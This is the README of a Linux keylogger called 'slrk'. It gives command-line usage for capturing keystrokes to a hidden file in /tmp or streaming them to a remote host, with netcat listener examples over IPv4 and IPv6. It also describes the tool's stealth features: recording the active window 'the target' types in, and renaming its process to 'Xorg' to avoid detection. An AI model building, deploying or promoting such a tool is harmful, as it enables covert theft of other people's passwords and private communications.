# Simple_Local&Remote_Keylogger

Simple keylogger that runs on Linux.<br>
It must be run as root.

__________________________________________________________________________
Usage: #./slrk [OPTIONS]<br>
<br>
OPTIONS:<br>
	-d \<input-device\>:  if not specified, the default device is '/dev/input/by-path/***kbd'<br>
	-o \<output-file\>:   it can be used only if '-m remote' option is not specified. The default output file is '/tmp/.logger.txt'<br>
	-m remote -a \<IP-ADDR\> -p \<PORT\>: it sends all the keystrokes on the remote server located at \<IP-ADDR:PORT\><br>
<br>
EXAMPLE:<br><br>
Server$ nc -lvp 8888 > logger.txt<br>
Client#./slrk -m remote -a 127.0.0.1 -p 8888<br>

---It works also with ipv6--- <br><br>
Server$ nc -6 -lvp 8888 > logger.txt<br>
Client#./slrk -m remote -a ::1 -p 8888
__________________________________________________________________________
<br>(It shows the active window on which the target is writing)
<br>(Keys are mapped on English keyboard)<br>
(Process name is renamed as "Xorg")
